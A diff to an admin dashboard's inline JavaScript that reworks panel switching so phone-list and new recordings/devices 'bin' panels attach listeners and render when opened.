@@ -3557,35 +3969,37 @@ document.querySelectorAll('[data-panel][data-shell]').forEach(el => {
         toast('📱 Phones refreshed.', 'var(--primary)');
     });
 
-    // ── Hook into existing panel switching — attach listeners when App panel opens ──
-    const origSwitch = window.__origSwitchPanel || switchPanel;
-    function patchedSwitch(name, shell) {
-        origSwitch(name, shell);
-        if (name === 'app' && shell === 'admin') {
-            attachAppListeners();
-            renderPhoneList();
-        }
-    }
-    // Replace global references to switchPanel click handlers
+    // ── Hook into panel switching ───────────────────────────────────────────
     document.querySelectorAll('[data-panel="app"][data-shell="admin"]').forEach(el => {
         el.addEventListener('click', () => {
             attachAppListeners();
             renderPhoneList();
         });
     });
+    document.querySelectorAll('[data-panel="app-bin"][data-shell="admin"]').forEach(el => {
+        el.addEventListener('click', () => {
+            attachAppListeners();
+            appCurrentBinTab = 'recordings';
+            document.getElementById('appBinTabRec').classList.add('active');
+            document.getElementById('appBinTabDev').classList.remove('active');
+            renderAppBin();
+        });
+    });
 
-    // Also attach when navigating if already loaded (admin session already open)
+    // Patch the global switchPanel if it exists, to attach listeners when these panels open
     const origSwitchPanel = window.switchPanel;
     if (origSwitchPanel) {
         const _orig = origSwitchPanel;
-        window.switchPanel = function(name, shell) {
+        window.switchPanel = function (name, shell) {
             _orig(name, shell);
-            if (name === 'app' && shell === 'admin') {
+            if (shell === 'admin' && (name === 'app' || name === 'app-bin')) {
                 attachAppListeners();
-                setTimeout(renderPhoneList, 200);
+                if (name === 'app')     setTimeout(renderPhoneList, 100);
+                if (name === 'app-bin') setTimeout(renderAppBin, 100);
             }
         };
     }
+
 })();
 </script>
 </body>
